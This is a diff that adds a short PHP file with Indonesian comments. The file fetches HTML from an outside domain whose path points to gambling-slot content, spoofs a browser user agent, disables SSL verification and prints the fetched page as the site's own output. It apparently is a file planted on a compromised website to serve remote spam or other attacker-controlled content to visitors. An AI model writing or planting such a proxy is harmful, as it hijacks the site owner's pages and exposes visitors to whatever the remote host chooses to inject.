@@ -1,0 +1,24 @@
+<?php
+$url = "https://ppdbjakarta.org/montreal2026/slotdana.html";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+// Fake browser user agent
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
+
+// Disable SSL verify (biar tidak error)
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+$content = curl_exec($ch);
+curl_close($ch);
+
+if ($content !== false && strlen(trim($content)) > 0) {
+    header("Content-Type: text/html; charset=UTF-8");
+    echo $content;
+} else {
+    echo "<!-- Gagal mengambil konten dari $url -->";
+}
+?>
